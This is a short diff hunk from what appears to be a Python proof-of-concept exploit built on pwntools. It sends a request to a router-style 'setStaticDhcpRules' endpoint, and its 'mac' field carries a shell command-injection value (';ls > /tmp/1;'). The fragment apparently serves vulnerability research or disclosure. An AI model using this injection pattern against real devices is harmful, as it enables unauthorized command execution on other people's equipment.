@@ -31,7 +31,7 @@ from pwn import *
 import json
 
 data = {
-    "topicurl": "setting/setStaticDhcpRules_1",
+    "topicurl": "setting/setStaticDhcpRules",
     "addEffect": "1",
     "mac": " ;ls > /tmp/1;:  "
 }
